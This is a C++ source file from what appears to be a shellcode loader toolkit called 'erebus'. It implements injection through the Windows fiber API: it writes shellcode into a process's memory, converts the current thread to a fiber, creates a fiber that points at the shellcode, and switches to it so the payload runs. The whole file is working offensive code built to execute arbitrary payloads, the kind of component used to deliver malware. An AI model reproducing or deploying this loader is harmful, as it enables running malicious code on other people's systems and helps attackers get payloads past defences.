#include "../../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 3
	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. CreateFiber");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		// Convert current thread to fiber
		LPVOID main_fiber = ConvertThreadToFiber(NULL);
		if (main_fiber == NULL) {
			LOG_ERROR("Failed to convert thread to fiber (Code: 0x%08lX)", GetLastError());
			return;
		}

		LOG_SUCCESS("Converted thread to fiber");

		// Create a new fiber pointing to shellcode
		LPVOID shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base_address, NULL);
		if (shellcode_fiber == NULL) {
			LOG_ERROR("Failed to create fiber (Code: 0x%08lX)", GetLastError());
			ConvertFiberToThread();
			return;
		}

		LOG_SUCCESS("Created shellcode fiber at: 0x%p", shellcode_fiber);

		// Switch to shellcode fiber - execution happens here
		LOG_INFO("Switching to shellcode fiber...");
		SwitchToFiber(shellcode_fiber);

		// Control returns here after shellcode completes
		LOG_SUCCESS("Shellcode fiber execution completed");

		// Give shellcode time to complete any async operations
		Sleep(500);

		// Clean up the shellcode fiber
		if (shellcode_fiber != NULL && shellcode_fiber != main_fiber)
		{
			DeleteFiber(shellcode_fiber);
			LOG_SUCCESS("Shellcode fiber deleted");
		}

		// Convert fiber back to thread
		if (main_fiber != NULL)
		{
			ConvertFiberToThread();
			LOG_SUCCESS("Converted fiber back to thread");
		}

		LOG_SUCCESS("Injection Complete!");

		return;
	}
#endif
} // namespace erebus
